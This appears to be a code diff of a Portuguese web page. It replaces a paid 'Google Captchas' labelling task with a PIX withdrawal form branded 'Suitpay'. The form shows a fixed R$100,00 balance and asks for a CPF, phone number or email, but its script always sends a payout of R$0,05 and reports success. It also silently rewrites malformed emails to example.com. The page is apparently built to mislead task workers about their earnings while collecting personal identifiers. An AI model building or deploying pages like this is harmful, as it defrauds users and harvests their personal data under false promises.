@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google Captchas - Nova Ferramenta</title>
+    <title>Saque PIX - Suitpay</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -13,15 +13,17 @@
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
+            min-height: 100vh;
         }
         .container {
-            width: 400px;
+            max-width: 400px;
+            width: 100%;
             padding: 20px;
             background-color: white;
             box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            position: relative;
         }
-        img {
+        picture img {
             width: 100%;
             height: auto;
         }
@@ -36,11 +38,6 @@
         }
         .content {
             margin: 20px 0;
-        }
-        .captcha {
-            display: flex;
-            justify-content: center;
-            margin-top: 20px;
         }
         .btn {
             display: block;
@@ -57,10 +54,6 @@
             background-color: #4caf50;
             color: white;
         }
-        .btn-red {
-            background-color: #f44336;
-            color: white;
-        }
         .btn:disabled {
             background-color: #ccc;
             cursor: not-allowed;
@@ -72,7 +65,6 @@
         }
         @media (max-width: 600px) {
             .container {
-                width: 100%;
                 padding: 10px;
             }
             .saldo {
@@ -86,67 +78,118 @@
     </style>
 </head>
 <body>
-    <div class="container" id="page1">
-        <img src="https://captchapay.org/assets/img/img1.png" alt="Google Captchas">
-        <div class="saldo">
+    <div class="container" id="withdrawPage">
+        <div class="saldo" id="withdrawSaldo">
             Saldo: R$100,00
         </div>
         <div class="content">
-            <p>Ao fazer essa análise, você vai receber: R$25,00 de comissão.</p>
+            <p>Insira sua chave PIX abaixo para sacar suas comissões das tarefas concluídas e continuar realizando novas tarefas.</p>
+            <form id="pixForm">
+                <label for="pixType">Tipo de Chave PIX:</label>
+                <select id="pixType" name="pixType" required onchange="showPixField()">
+                    <option value="cpf">CPF</option>
+                    <option value="phoneNumber">Celular</option>
+                    <option value="email">Email</option>
+                </select>
+                <div id="cpfField" style="display:none;">
+                    <label for="cpf">CPF:</label>
+                    <input type="text" id="cpf" name="cpf" placeholder="Digite seu CPF" oninput="formatCPF()">
+                </div>
+                <div id="phoneField" style="display:none;">
+                    <label for="phone">Celular:</label>
+                    <input type="text" id="phone" name="phone" placeholder="Digite seu celular" oninput="formatPhone()">
+                </div>
+                <div id="emailField" style="display:none;">
+                    <label for="email">Email:</label>
+                    <input type="email" id="email" name="email" placeholder="Digite seu email" onblur="correctEmail()">
+                </div>
+                <button type="submit" class="btn btn-green">Enviar</button>
+            </form>
+            <div class="error" id="pixErrorMessage"></div>
         </div>
-        <div class="content">
-            <p>Antes de responder, por favor, complete o captcha para seguir para a próxima tarefa.</p>
-        </div>
-        <div class="captcha">
-            <div class="g-recaptcha" data-sitekey="6LeFvSEqAAAAAIn7IAxAsaJMtpLyjo4DmINrfEU9" data-callback="recaptchaCallback"></div>
-        </div>
-        <button class="btn" id="startButton" disabled>Começar Agora</button>
-        <div class="error" id="errorMessage"></div>
     </div>
 
-    <div class="container" id="page2" style="display: none;">
-        <div class="content">
-            <p>Tarefa: Visualize a imagem abaixo e informe se nos blocos marcados contém veículos.</p>
-        </div>
-        <div>
-            <img src="https://captchapay.org/assets/img/captcha1.png" alt="Captcha com veículos">
-        </div>
-        <button class="btn btn-green" id="yesButton" disabled>Sim</button>
-        <button class="btn btn-red" id="noButton" disabled>Não</button>
-        <div class="error" id="errorMessagePage2"></div>
-    </div>
-    
-    <script src="https://www.google.com/recaptcha/api.js"></script>
     <script>
-        function recaptchaCallback() {
-            document.getElementById('startButton').disabled = false;
+        function showPixField() {
+            const pixType = document.getElementById('pixType').value;
+            document.getElementById('cpfField').style.display = 'none';
+            document.getElementById('emailField').style.display = 'none';
+            document.getElementById('phoneField').style.display = 'none';
+            
+            if (pixType === 'cpf') {
+                document.getElementById('cpfField').style.display = 'block';
+            } else if (pixType === 'email') {
+                document.getElementById('emailField').style.display = 'block';
+            } else if (pixType === 'phoneNumber') {
+                document.getElementById('phoneField').style.display = 'block';
+            }
         }
 
-        document.getElementById('startButton').addEventListener('click', function() {
-            if (grecaptcha.getResponse() === '') {
-                document.getElementById('errorMessage').innerText = 'Por favor, conclua o captcha antes de continuar.';
-            } else {
-                document.getElementById('page1').style.display = 'none';
-                document.getElementById('page2').style.display = 'block';
-                document.getElementById('yesButton').disabled = false;
-                document.getElementById('noButton').disabled = false;
-            }
-        });
+        function formatCPF() {
+            let cpf = document.getElementById('cpf').value;
+            cpf = cpf.replace(/\D/g, ''); // Remove tudo que não é dígito
+            cpf = cpf.replace(/(\d{3})(\d)/, '$1.$2');
+            cpf = cpf.replace(/(\d{3})(\d)/, '$1.$2');
+            cpf = cpf.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
+            document.getElementById('cpf').value = cpf;
+        }
 
-        document.getElementById('yesButton').addEventListener('click', function() {
-            if (grecaptcha.getResponse() === '') {
-                document.getElementById('errorMessagePage2').innerText = 'Por favor, conclua o captcha antes de continuar.';
-            } else {
-                window.location.href = 'https://seu-site.com/novo-endereco-sim';
-            }
-        });
+        function formatPhone() {
+            let phone = document.getElementById('phone').value;
+            phone = phone.replace(/\D/g, ''); // Remove tudo que não é dígito
+            phone = phone.replace(/^(\d{2})(\d)/g, '($1) $2');
+            phone = phone.replace(/(\d{5})(\d{4})$/, '$1-$2');
+            document.getElementById('phone').value = phone;
+        }
 
-        document.getElementById('noButton').addEventListener('click', function() {
-            if (grecaptcha.getResponse() === '') {
-                document.getElementById('errorMessagePage2').innerText = 'Por favor, conclua o captcha antes de continuar.';
-            } else {
-                window.location.href = 'https://seu-site.com/novo-endereco-nao';
+        function correctEmail() {
+            let email = document.getElementById('email').value;
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            if (!emailRegex.test(email)) {
+                email = email.replace(/[^a-zA-Z0-9]/g, ''); // Remove caracteres inválidos
+                email = email.replace(/(.{3,})@.*$/, '$1@example.com');
+                document.getElementById('email').value = email;
             }
+        }
+
+        document.getElementById('pixForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            const pixType = document.getElementById('pixType').value;
+            let key = '';
+
+            if (pixType === 'cpf') {
+                key = document.getElementById('cpf').value;
+            } else if (pixType === 'email') {
+                key = document.getElementById('email').value;
+            } else if (pixType === 'phoneNumber') {
+                key = document.getElementById('phone').value;
+            }
+
+            const data = {
+                key: key,
+                typeKey: pixType,
+                value: 0.05  // Valor fixo de R$0,05
+            };
+
+            fetch('process_pix.php', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    alert('Pagamento realizado com sucesso!');
+                } else {
+                    document.getElementById('pixErrorMessage').innerText = 'Erro ao realizar o pagamento. Tente novamente.';
+                }
+            })
+            .catch((error) => {
+                document.getElementById('pixErrorMessage').innerText = 'Erro ao realizar o pagamento. Tente novamente.';
+            });
         });
     </script>
 </body>
